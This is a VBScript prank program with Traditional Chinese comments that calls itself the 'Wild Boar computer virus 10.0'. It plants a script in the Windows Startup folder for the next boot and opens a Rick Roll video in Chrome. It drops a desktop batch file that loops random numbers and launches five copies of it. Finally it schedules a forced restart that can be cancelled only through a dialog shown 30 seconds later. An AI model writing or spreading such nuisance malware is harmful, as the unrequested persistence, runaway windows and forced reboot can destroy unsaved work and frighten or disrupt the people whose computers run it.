Dim ans
' 彈出視窗，並把人類按下的結果存進「ans」裡
ans = MsgBox("確定執行？", 4132, "lol")

' 數字 6 代表人類按了「是」，7 代表「否」
If ans = 6 Then
    ' 如果按了是，就執行這個
    MsgBox "不要後悔", 4144, "lol"
Else
    ' 如果按了否，就執行這個
    MsgBox "確定執行？", 4128, "lol"
    MsgBox "不要後悔", 4144, "lol"
End If

' =======================================================
' ??? 第一階段：山豬開機下蛋程式
' =======================================================
Dim WshShell, FSO, startupFolder, dropPath, file
Dim desktopFolder ' ?? 幫你把後面的變數移到最前面統一宣告！

' 召喚精靈與檔案管理員
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
startupFolder = WshShell.SpecialFolders("Startup")

' 設定要偷偷生出來的檔案叫做 lol.vbs
dropPath = startupFolder & "\lol.vbs"

' 開始在開機資料夾建立檔案！
Set file = FSO.CreateTextFile(dropPath, True, False)
file.WriteLine "' 1. 先跳出你想要的訊息盒"
file.WriteLine "MsgBox ""我還活著XD"", 4112, ""lol"""
file.WriteLine ""
file.WriteLine "' 2. 召喚檔案管理員，並且把自己吃掉（刪除）！"
file.WriteLine "CreateObject(""Scripting.FileSystemObject"").DeleteFile(WScript.ScriptFullName)"
file.Close ' 下蛋完畢，拍拍屁股走豬！

' =======================================================
' ??? 第二階段：瑞克搖與突擊網頁
' =======================================================
' ?? 統一用 WshShell 來跑腿！
WshShell.Run "chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ"
MsgBox "rick roll:)", 4160, "lol"
WshShell.Run "chrome https://www.scimonth.com.tw/upload/P34.jpg"

' =======================================================
' ??? 第三階段：桌面亂碼駭客蛋
' (注意！這裡不用再寫 Dim 和 CreateObject 囉，因為前面都召喚過了！)
' =======================================================
' 定位「桌面 (Desktop)」的位置
desktopFolder = WshShell.SpecialFolders("Desktop")

' 設定桌面檔案的完整路徑
dropPath = desktopFolder & "\亂碼.bat"

' 創造桌面檔案！
Set file = FSO.CreateTextFile(dropPath, True, False)
file.WriteLine "@echo off"
file.WriteLine "color 02"
file.WriteLine ":boar_loop"
file.WriteLine "echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%"
file.WriteLine "goto boar_loop"
file.Close ' ?? 寫完記得關閉檔案！

' 讓山豬原地睡覺等待 5 秒鐘 (5000毫秒)... zzz... ????
WScript.Sleep 5000

' ?? 終極魔法：直接執行我們剛剛做出來的檔案！
' (外面包上 """" 雙引號是為了防止路徑裡面有空白導致老山豬迷路)
WshShell.Run """" & dropPath & """"
WshShell.Run """" & dropPath & """"
WshShell.Run """" & dropPath & """"
WshShell.Run """" & dropPath & """"
WshShell.Run """" & dropPath & """"



' =======================================================
' ??? 第四階段：死亡倒數與最後的希望！
' (不用再寫 Dim 和 Set 囉，前面都準備好了！)
' =======================================================

' 1. 直接叫精靈發動死亡倒數！(60秒)
WshShell.Run "shutdown /r /t 60", 0

' 2. 山豬原地睡覺等待 30 秒... zzz... 
WScript.Sleep 30000

' 3. 蹦！跳出霸屏視窗逼問！
ans = MsgBox("要取消重啟嗎？", 4148, "lol")

' 4. 判斷人類的求生意志！
If ans = 6 Then
    ' 按下「是」(6)，解除危機！
    WshShell.Run "shutdown /a", 0
    MsgBox "成功取消", 64, "lol"  ' ?? 拔掉括號啦！
End If
MsgBox "感謝使用山豬電腦病毒10.0", 64, "lol" ' ?? 這裡也拔掉括號！

